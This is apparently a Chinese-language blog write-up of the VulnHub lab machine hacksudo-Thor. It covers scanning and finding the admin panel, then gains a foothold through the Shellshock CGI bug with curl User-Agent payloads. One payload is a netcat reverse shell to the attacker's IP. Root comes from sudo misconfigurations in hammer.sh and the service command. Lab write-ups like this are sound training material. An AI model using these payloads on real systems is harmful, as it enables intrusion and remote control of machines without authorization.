---
title: VulnHub-10-hacksudo-Thor
author: 干 脆 面
tags:
  - "靶机\U0001F3AF"
  - "VulnHub\U0001F3AF"
categories:
  - "安全\U0001F510"
top: 15
abbrlink: d2a7ad22
date: 2022-08-07 10:10:55
---

> **靶机：**https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip
>
> **难度：**中
>
> **目标：**取得 root 权限 + Flag

<!-- more -->

## 一、信息收集

### 主机发现

```
sudo arp-scan -l
```

![image-20220304093800830](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220304093800830.png)

### 端口扫描

```
sudo nmap -p- 192.168.137.28
```

![image-20220304094324579](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220304094324579.png)

### 服务探测

```
sudo nmap -p21,22,80 192.168.137.28
```

![image-20220304094555922](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220304094555922.png)

### 访问80端口

发现登陆页面

![image-20220304094659555](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220304094659555.png)

尝试弱口令登陆，无果

![image-20220307104736455](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220307104736455.png)

查看源代码，发现有注释与**cgi**相关

![image-20220308090817130](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308090817130.png)

关于**cgi**

>CGI（Common Gateway Interface）[公共网关接口](https://baike.baidu.com/item/公共网关接口/10911997)，是外部扩展应用程序与 Web 服务器交互的一个标准接口。服务器端与[客户端](https://baike.baidu.com/item/客户端/101081)进行交互的常见方式多，CGI 技术就是其中之一。
>
>https://baike.baidu.com/item/CGI/607810?fromtitle=%EF%BC%A3%EF%BC%A7%EF%BC%A9&fromid=6717913

关于**cgi-bin**目录

>CGI-BIN是一种特殊的目录，在进行交互式的WWW访问（如填写在线表格）时，需要服务器上有 相应的程序对访问者输入的信息进行处理，这些程序就是CGI程序。
>
>https://baike.baidu.com/item/cgi-bin%E7%9B%AE%E5%BD%95/4172160

访问**cgi-bin**目录

![image-20220308092219741](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308092219741.png)

直接访问该目录页面响应403

### 目录扫描

```
dirsearch -u http://192.168.137.28
```

![image-20220308094720150](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308094720150.png)

访问README.md

![image-20220308094927632](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308094927632.png)

![image-20220308095027871](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308095027871.png)

访问github地址

![image-20220308095129474](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308095129474.png)

文件内说明了前后端及数据库所用的组件，和默认的管理员账号密码

尝试默认密码，结果失败

![image-20220308095625298](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308095625298.png)

尝试访问目录扫描结果中的admin_login.php

![image-20220308101621013](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308101621013.png)

成功登陆管理员后台

![image-20220308101644312](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308101644312.png)

### 后台信息探测

点击管理账号

![image-20220308141022474](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308141022474.png)

发现相关账号密码信息

![image-20220308141107045](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308141107045.png)

尝试登陆

![image-20220308141404231](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308141404231.png)

登陆成功

![image-20220308141421478](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308141421478.png)

发现类似账单的表单

![image-20220308141504425](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308141504425.png)

尝试向Jon Snow进行转账（支付密码尝试使用登陆密码）

![image-20220308142001773](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308142001773.png)

![image-20220308142116120](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308142116120.png)

页面返回结果提示转账成功

![image-20220308142146894](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308142146894.png)

再返回查看Jon Snow的账号和密码

![image-20220308142457122](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308142457122.png)

尝试登陆Jon Snow 账号，在转账记录中确实存在刚才的转账行为记录

![image-20220308142659028](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308142659028.png)

## 二、破壳漏洞

目前为止后台的信息基本上是停滞了，打开思路，看能否利用破壳漏洞🐣

在shell中,我们可以使用`export var="value"`定义环境变量,使用`funcname(){ statements }`定义函数.

在版本较旧的bash中存在着这么一种漏洞:`export x="(){ :; }; command "`

由于bash的解析问题,当创建环境变量时,变量被定义为一个匿名函数,这个时候后面的`command`会被立即执行

参考链接：https://blog.csdn.net/xiaoshan812613234/article/details/42147955

在web的`/cgi-bin`下的脚本大多数都是用bash此类的shell解析器进行执行的,所以我们可以利用这个方式执行任意的漏洞

那么现在的任务就是找到`/cgi-bin`下的脚本并利用

验证想法

### 漏洞验证

针对cgi目录进行扫描

```
dirsearch -u http://192.168.137.28/cgi-bin/ -f -e cgi,sh
```

![image-20220308163712423](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220308163712423.png)

**PS:因为实验中断暂停所以更换了网络，现在目标靶机的IP为192.168.1.104**

访问/cgi-bin/shell.sh 500报错

![image-20220706104750728](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706104750728.png)

使用nmap探测

```
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.1.104
```

![image-20220706105603315](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706105603315.png)

```
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 192.168.1.104
```

![image-20220706113746971](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706113746971.png)

验证结果确实存在该漏洞

### 漏洞利用

通过wireshark分析exp

使用`curl`构造特殊的请求包

```
curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'which nc'" http://192.168.1.104/cgi-bin/shell.sh
```

![image-20220706114111157](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706114111157.png)

可以成功执行命令

本地监听

![image-20220706114411586](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706114411586.png)

```
curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'nc -e /bin/bash 192.168.1.102 4444'" http://192.168.1.104/cgi-bin/shell.sh
```

![image-20220706114619044](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706114619044.png)

成功反弹shell

升级为交互式

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![image-20220706114709248](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706114709248.png)

### 权限提升

查看有无sudo命令的权限漏洞

```
sudo -l
```

![image-20220706140944639](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706140944639.png)

发现此处可以使用Thor用户执行hammer.sh

```
sudo -u thor /home/thor/./hammer.sh
```

![image-20220706141016536](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706141016536.png)

发现执行hammer.sh提示要输入密钥 在不知其所以然的情况下 先随意输入 继续流程

![image-20220706141226733](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706141226733.png)

发现程序2次输入 第一次是“命名” 第二次是“执行”

可以尝试执行bash命令

![image-20220706144052696](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706144052696.png)

成功获取到了Thor用户的权限

仍然是尝试查看有无sudo命令的权限漏洞

```
sudo -l
```

![image-20220706144152337](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706144152337.png)

当service命令sudo权限配置不当时可以利用如下命令来提权

```
sudo /usr/sbin/service ../../bin/bash
```

![image-20220706145225253](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706145225253.png)

查看flag

![image-20220706145357447](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706145357447.png)

彩蛋在proof.txt内

![image-20220706145504513](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706145504513.png)
